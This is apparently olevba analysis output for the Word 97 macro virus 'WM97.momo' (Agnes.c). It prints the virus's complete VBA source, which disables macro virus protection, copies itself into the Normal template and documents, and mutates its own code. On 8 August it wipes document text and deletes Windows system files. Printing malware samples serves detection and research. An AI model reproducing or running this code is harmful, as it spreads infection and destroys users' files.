olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Agnes.c-0f62d05d76ab775e93acd79c38fd41d8df5b5b5d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Agnes.c-0f62d05d76ab775e93acd79c38fd41d8df5b5b5d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO momo.bas 
in file: Virus.MSWord.Agnes.c-0f62d05d76ab775e93acd79c38fd41d8df5b5b5d - OLE stream: 'Macros/VBA/momo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer
Sub KiCuQz3859()

    ' -= [LineZerO's Macro Engine 1.2] =-
    ' -= [WM97.momo] =-

    ' -= [ID: 23451-Bx-54053859-Bm.W] =-

On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
 'This code is taken from Pyro | Thanks
Set Current = MacroContainer
For Grow = 1 To 20
Number = Current.VBProject.VBComponents("momo").CodeModule.ProcCountLines("KiCuQz3859", vbext_pk_Proc)
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 40 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
Current.VBProject.VBComponents("momo").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
Remark = ""
Next Grow
If Day(Now()) = 8 And Month(Now()) = 8 Then
Application.Username = "MOMO"
Selection.Wholestory
Selection.Cut
ActiveDocument.SaveAs ActiveDocument.FullName
Kill ("C:\WINDOWS\SYSTEM\*.*")
While ShowCursor(False) >= 0
Wend
Call JoVlLr9070
WordBasic.FileExit dlg
End If
Application.CommandBars("View").Controls(6).Delete
Application.CommandBars("Format").Controls(12).Delete
Application.CommandBars("Tools").Controls(12).Delete
Application.CommandBars("Tools").Controls(13).Delete
End Sub
Sub JoVlLr9070()
On Error Resume Next
Application.CommandBars("Edit").Enabled = False
Application.CommandBars("Insert").Enabled = False
Application.CommandBars("Format").Enabled = False
End Sub
Sub Bx5405()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options
.SaveNormalPrompt = False
.VirusProtection = False
.ConfirmConversions = False
End With
Application.VBE.ActiveVBProject.VBComponents("momo").Export "C:\momo.sys"
With Dialogs(wdDialogFileSummaryInfo)
.Author = Chr(74) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(84) + Chr(119) + Chr(111) + Chr(102) + Chr(108) + Chr(111) + Chr(119) + Chr(101) + Chr(114) + Chr(32) + Chr(45) + Chr(61) + Chr(91) + Chr(76) + Chr(105) + Chr(110) + Chr(101) + Chr(90) + Chr(101) + Chr(114) + Chr(216) + Chr(32) + Chr(86) + Chr(120) + Chr(32) + Chr(84) + Chr(101) + Chr(97) + Chr(109) + Chr(93) + Chr(61) + Chr(45)
.Comments = "WM97.momo" & Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(76) + Chr(105) + Chr(77) + Chr(69) + Chr(32) + Chr(49) + Chr(46) + Chr(111)
.Keywords = "LiME ID: 23451-Bx-54053859-Bm.W"
.Execute
End With
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(x).Name = "momo" Then DgDmFu5117PwVzPp5405 = True
Next x
For y = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(y).Name = "momo" Then NhJtFj9070KiCuQz3859 = True
Next y
If DgDmFu5117PwVzPp5405 = True And NhJtFj9070KiCuQz3859 = False Then Set MiRxQx4019JoVlLr4336 = ActiveDocument.VBProject
If DgDmFu5117PwVzPp5405 = False And NhJtFj9070KiCuQz3859 = True Then Set MiRxQx4019JoVlLr4336 = NormalTemplate.VBProject
If DgDmFu5117PwVzPp5405 = True And NhJtFj9070KiCuQz3859 = True Then GoTo Ende_
MiRxQx4019JoVlLr4336.VBComponents.Import "C:\momo.sys"
If NhJtFj9070KiCuQz3859 = False Then ActiveDocument.SaveAs (WordBasic.[FileName$]()), FileFormat:=wdFormatDocument
If DgDmFu5117PwVzPp5405 = False Then NormalTemplate.Save
Ende_:
Call KiCuQz3859
End Sub
Sub AutoOpen()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
End Sub
Sub AutoExit()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
End Sub
Sub AutoNew()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
End Sub
Sub AutoExec()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
End Sub
Sub DateiNeu()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
Call Bx5405
Call KiCuQz3859
End Sub
Sub DateiOffnen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call Bx5405
Call KiCuQz3859
End Sub
Sub DateiSchliesen()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
WordBasic.FileClose dlg
End Sub
Sub DateiSpeichern()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
ActiveDocument.Save
End Sub
Sub DateiSpeichernUnter()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub DateiDrucken()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
Dialogs(wdDialogFilePrint).Show
End Sub
Sub BearbeitenErsetzen()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
Dialogs(wdDialogEditReplace).Show
End Sub
Sub ExtrasRechtschreibung()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
If Options.CheckGrammarWithSpelling = True Then
ActiveDocument.CheckGrammar
Else
ActiveDocument.CheckSpelling
End If
End Sub
Sub ExtrasSilbentrennung()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
Dialogs(wdDialogsToolsHyphenation).Show
End Sub
Sub ExtrasOptionen()
On Error Resume Next
Call Bx5405
Call KiCuQz3859
Dialogs(wdDialogToolsOptions).Show
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

